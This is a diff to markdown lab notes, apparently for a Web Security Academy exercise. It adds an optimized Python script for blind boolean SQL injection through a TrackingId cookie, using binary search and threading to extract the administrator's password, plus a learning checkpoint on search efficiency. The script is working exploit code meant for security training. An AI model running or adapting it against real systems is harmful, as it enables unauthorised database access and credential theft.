@@ -192,7 +192,70 @@ if __name__ == "__main__":
     extract_password(sys.argv[1].rstrip('/'), sys.argv[2])
 
 ```
+## Optimized
 
+```python
+import requests
+import string
+import sys
+import concurrent.futures
+
+URL = "https://0a3e009103d8549081cb3fb9006e00ec.web-security-academy.net/login"
+BASE_TRACKING_ID = "jcNRA8merHx7L1cA"
+SESSION_ID = "3fiB8hekGGxKB4OmSB3pqFDFh98oTpBr"
+
+CHARSET = string.ascii_lowercase + string.digits
+
+# Reuse a single TCP connection instead of opening a new one per request
+session = requests.Session()
+
+def oracle(condition: str) -> bool:
+    payload = f"' AND {condition}--"
+    cookies = {'TrackingId': BASE_TRACKING_ID + payload, 'session': SESSION_ID}
+    r = session.get(URL, cookies=cookies)
+    return "Welcome back" in r.text
+
+def get_length(max_len=100) -> int:
+    # Binary search instead of linear 1..100 scan
+    lo, hi = 1, max_len
+    while lo < hi:
+        mid = (lo + hi) // 2
+        if oracle(f"(SELECT LENGTH(password) FROM users WHERE username='administrator')<={mid}"):
+            hi = mid
+        else:
+            lo = mid + 1
+    print(f"[+] Password length: {lo}")
+    return lo
+
+def get_char_at(pos: int) -> str:
+    # Binary search over ASCII code instead of trying every character
+    lo, hi = 32, 126
+    while lo < hi:
+        mid = (lo + hi) // 2
+        if oracle(f"(SELECT ASCII(SUBSTRING(password,{pos},1)) FROM users WHERE username='administrator')<={mid}"):
+            hi = mid
+        else:
+            lo = mid + 1
+    return chr(lo)
+
+def get_data(length: int) -> str:
+    # Extract each position concurrently instead of one at a time
+    chars = [None] * length
+    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
+        futures = {ex.submit(get_char_at, i + 1): i for i in range(length)}
+        for fut in concurrent.futures.as_completed(futures):
+            idx = futures[fut]
+            chars[idx] = fut.result()
+            sys.stdout.write(f"\r[+] {''.join(c or '_' for c in chars)}")
+            sys.stdout.flush()
+    print()
+    return "".join(chars)
+
+if __name__ == "__main__":
+    pwd_length = get_length()
+    password = get_data(pwd_length)
+    print(f"[+] Administrator password: {password}")
+```
 > **Learning Checkpoint 3:** How could this script be optimized? The current script uses a **Linear Search**, testing `a`, then `b`, then `c` (O(N) time). Advanced tooling (like SQLmap) uses a **Binary Search** (`> 'm'`), repeatedly halving the character space to find the target character in ~6 requests instead of up to 36 requests (O(log N) time), drastically reducing network noise and execution time.
 
 ---
